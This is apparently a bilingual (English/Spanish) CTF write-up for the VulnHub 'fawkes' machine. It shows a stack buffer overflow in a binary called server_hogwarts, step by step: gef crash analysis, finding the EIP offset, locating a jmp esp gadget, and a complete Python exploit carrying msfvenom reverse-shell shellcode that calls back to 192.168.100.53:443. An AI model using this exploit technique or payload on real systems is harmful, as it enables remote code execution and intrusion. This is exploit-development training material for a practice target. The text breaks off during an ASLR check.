Error from clientzsh: segmentation fault  ./server_hogwarts
```
# BOF trying to corrupt the program
explanaition 
we verify before the AAA's to make sure that we could exceed the size of the buffer assign it by the programmer when if you exceed the buffer assign it by the programmer you start to write on EBP - RET which is the EIP  the instrction pointer and we can take adventage of it 

the idea is to corrupt the program we have to measure how many "AAA" we have to add in order to write the esp and the eip 

to measure that we have to use gdb tool

```gdb + program + -q ``` ejm

```bash
gdb ./service_howarts -q
```
now we have to launch the program by write 'r'

```bash
Error from clientzsh: segmentation fault  ./server_hogwarts
❯ gdb ./server_hogwarts -q
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.01ms using Python engine 3.9
Reading symbols from ./server_hogwarts...
(No debugging symbols found in ./server_hogwarts)
gef➤  r
Starting program: /home/z3kk3n/Desktop/vulnHUB/fawkes/content/server_hogwarts 
[*] Failed to find objfile or not a valid file format: [Errno 2] No existe el fichero o el directorio: 'system-supplied DSO at 0xf7ffc000'

```

now if we try to add again the "AA" in order to find if we write the eip + esp
from another terminal we open the program just like we did before

```nc localhost 9898``` and if we add the AA let's check the output of the program 

output from gef

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd350  →  "our spell: "
$edx   : 0xffffd194  →  "our spell: "
$esp   : 0xffffce00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd348  →  "\nEnter your spell: "
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce00│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
0xffffce04│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce08│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce0c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce10│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce14│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce18│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce1c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────
```

Look right here the value of ```$eip   : 0x41414141 ("AAAA"?)``` is AAAA take under consideration that ```eip``` it's very important because it's the instruction pointer is the object in charge of pointing to the next address that the program flow has to go to in order to interpret new instructions

the reason of the segmentation fault is because AAA does not exist and eip is trying to get something from there and what eip found was AAA because of us. that's where we have to inyect our code instead if AAA to give to eip a new address to point in a nutshell in order to gain access

almost forgot 

you have to check the security of the program, using gef you have to tell gef ```checksec``` ex

```bash
gef➤  checksec
[+] checksec for '/home/z3kk3n/Desktop/vulnHUB/fawkes/content/server_hogwarts'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✓ (value: 0xfe728800)
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
gef➤  
```
according with this output seems that 
NX is disable --> means that it allow us to pointing to the next address that the program flow has to go to in order to interpret new instructions (shellcode allowed )
PIE is disable --> 
RelRO is disable -->  

to measure where eip values something, we will work with gef + pattern create

```bash
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef1'
gef➤  

```

now that code we have to paste where we are using the program

```bash
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
```

chekcing the output of gef we measures eip 

```bash
$eax   : 0xffffcd8c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffd350  →  "our spell: "
$edx   : 0xffffd194  →  "our spell: "
$esp   : 0xffffce00  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd348  →  "\nEnter your spell: "
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce00│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	← $esp
0xffffce04│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce08│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce0c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce10│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce14│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce18│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce1c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  


```

where eip values ```$eip   : 0x62616164 ("daab"?)``` daab

let's check how many AAA we have to add until we reach ```daab```

using echo 

```bash 
[root@parrot]─[/home/z3kk3n]
└──╼ #echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak" | grep daab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab ```daab```
heaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
```
and means that we have to add
all this characters  

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab```daab``` to reach eip which is daab
we can do it manually which is this way  tha t i explained before or do it automatic which is way 

with gef we will ask it the value of eip 

```bash
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search) 
gef➤  
```
so we have to add 112 characters let's verify it 

with python3 we will ask for an output of 112 A's + 4 B's + 100 C's

```python
python3 -c 'print ("A"*112) + "B"*4 + "C"*100'
```
the c's it's because i want to know always where c's will storage 

```bash
┌─[✗]─[root@parrot]─[/home/z3kk3n]
└──╼ #python3 -c 'print ("A"*112 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```
let's try it 

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd020  →  0x00000a ("\n"?)
$edx   : 0xffffce64  →  0x00000a ("\n"?)
$esp   : 0xffffce00  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd348  →  "\nEnter your spell: "
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce00│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffce04│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce08│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce0c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce10│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce14│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce18│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffce1c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

```
and it works 

we are able to write on the eip register 
because of this ```$eip   : 0x42424242 ("BBBB"?)``` 0x42 means B

to check if we are able to register the ```ESP``` the stack/ we have to check here 
with gef 
```bash
gef➤  x/50wx $esp
0xffffce00:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce10:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce20:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce30:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce40:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce50:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce60:	0x43434343	0x0000000a	0x00000000	0x00000000
0xffffce70:	0x00000000	0x00000000	0x00000000	0x636c6557
0xffffce80:	0x20656d6f	0x48206f74	0x6177676f	0x73277472
0xffffce90:	0x67616d20	0x70206369	0x6174726f	0x65540a6c
0xffffcea0:	0x79206c6c	0x2072756f	0x6c657073	0x6e61206c
0xffffceb0:	0x4c452064	0x20524544	0x444e4157	0x6c697720
```
to check the eip will be -4 where ```0x42424242``` will value B and ```0x43434343``` will value C so before ```0x43434343``` will be eip because the value of eip is ````0x42424242```

```bash 
gef➤  x/50wx $esp-4
0xffffcdfc:	0x42424242	0x43434343	0x43434343	0x43434343
0xffffce0c:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce1c:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce2c:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce3c:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce4c:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffce5c:	0x43434343	0x43434343	0x0000000a	0x00000000
0xffffce6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffce7c:	0x636c6557	0x20656d6f	0x48206f74	0x6177676f
0xffffce8c:	0x73277472	0x67616d20	0x70206369	0x6174726f
0xffffce9c:	0x65540a6c	0x79206c6c	0x2072756f	0x6c657073
0xffffceac:	0x6e61206c	0x4c452064	0x20524544	0x444e4157
0xffffcebc:	0x6c697720	0x6570206c
gef➤  
```

now how we know that we have to make a payload to take advange of it 

in this script we will work with socket in order to send data so we have to import socket 

so 

```python
import socket

offset = 112
before_eip = b"A"
```
offset means the eip which is 112 for that reason we will add that the value of offset is 112 in 

we will work with this syntaxis ```before eip``` and during ```eip``` and ```after eip```` 


```python
import socket

offset = 112
before_eip = b"A" * offset
```
before_eip what's before eip ? A's right ? so we have to add it * offset because offset is 112 so before eip will be 112 A's 
- b means bytes 
- "*" means a multiplication
- "offset" equals to 112

now we have to add during eip + after eip 
```python
import socket

offset = 112
before_eip = b"A" * offset
eip =
after_eip = 
```
- eip 
- after_eip we would add here our C's but we don't want to add c's we want add shellcode (shellcode means low level instructions)
to make it possible with msfvenom we will create our shellcode

```bash
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
```
here's my shellcode 

so instead of C in python script we will add the shellcode

```
shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
```
add it in exploit.py

```bash 
 #/usr/bin/python3
   2   │ 
   3   │ import socket 
   4   │ 
   5   │ offset = 112
   6   │ before_eip = b"A" * offset
   7   │ 
   8   │ eip = 
   9   │ 
  10   │ shellcode =  b""
  11   │ shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
  12   │ shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
  13   │ shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
  14   │ shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
  15   │ shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
  16   │ shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
  17   │ shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
  18   │ shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
  19   │ shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
  20   │ 
  21   │ 
  22   │ before_eip = b"C"*100 # ESP

```
before eip yo se que si pongo 100 c como lo hice, van a quedar en el ESP claro si tu lograras hacer que el eip  apuntara a una direccion la cual aplique un jump ESP para que apunte al ESP  el problema de este caso es que  cuando salte al ESP  puede generar un conflicto hay veces que  no llega a clavar justo al punto donde se encuentra el shellcode por tanto la idea seria jugar con nops para crear un espacio y en tal caso la instruccion como no es precisa caiga en un punto intermeedio de los nops para luego llegarlo a desplazar donde esta nuestro shellcode

entonces lo que vamos a hacer es definir nops 

```bash 
 #/usr/bin/python3
   2   │ 
   3   │ import socket 
   4   │ 
   5   │ offset = 112
   6   │ before_eip = b"A" * offset
   7   │ 
   8   │ eip = 
   9   │ 
  10   │ shellcode =  b""
  11   │ shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
  12   │ shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
  13   │ shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
  14   │ shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
  15   │ shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
  16   │ shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
  17   │ shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
  18   │ shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
  19   │ shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
  20   │ 
  21   │ 
  22   │ after_eip = b"\x90"*32 + shellcode # ESP

```
ahora como yo logro controlar el EIP tengo que buscar que el EIP apunte a una direccion donde se aplique un jump un salto al ESP para que asi a la hora de cargar esta instruccion vaya el flujo del programa al stack o sea al esp y como el esp es esto ```after_eip = b"\x90"*32 ``` para que no comience directamente con el shellcode que puede que entre en conflicto le damos un peque;o espacio  ```after_eip = b"\x90"*32 ``` para caer en un punto intermediario de los nops  y ya que esto nos mande al shellcode

ahora nuestro objetivo es buscar donde se aplique esta instruccion el jmp ESP 

para buscarla usaremos una tool que se llama objdump + -D + binario + | + grep + opcode


y con metasploit usamos namshell para buscar un operation code y tomar este operation code y filtrarlo 


ejm

```bash 
busquemos el operation code del jmp con metasploit 
❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
nasm > 
```
el operation code seria ```ffe4``` cuando lo vayamos a grepear hay que poner minusculas 

ejm 
```bash 
#objdump -D server_hogwarts | grep "ff e4"
 8049d55:	ff e4                	jmp    *%esp
 80b322c:	81 73 f6 ff e4 73 f6 	xorl   $0xf673e4ff,-0xa(%ebx)
 80b3253:	ff 91 73 f6 ff e4    	call   *-0x1b00098d(%ecx)
 80b500f:	ff e4                	jmp    *%esp
 80b51ef:	ff e4                	jmp    *%esp
 80b546f:	ff e4                	jmp    *%esp
 80d0717:	ff e4                	jmp    *%esp

```
and this is the direction because of ```ff e4``` > ```8049d55``` this one right ```8049d55``` 


si ahora yo lograra que el eip apuntara a esta direccion ```8049d55 ``` se deberia de aplicar un salto al esp 

como estamos en 32 bits tenemos que jugar con la direccion al reves seria copiar la direccion ```8049d55``` y ponerla alrevez ejem 

eip = ```bash"x55/x9d/x04/x08"``` # ```8049d55``` ->jmp ESP

the script will be like this 

```bash
#/usr/bin/python3

import socket 

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08" # 8049s55 jmp ESP

shellcode =  b""
shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"


after_eip = b"\x90"*32 + shellcode # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect (("127.0.0.1", 9898))
s.send(payload)
s.close()

```
let's try in our machine 

before you run this app please make sure to change this 

```bash
❯ cat /proc/sys/kernel/randomize_va_space
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /proc/sys/kernel/randomize_va_space
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 2
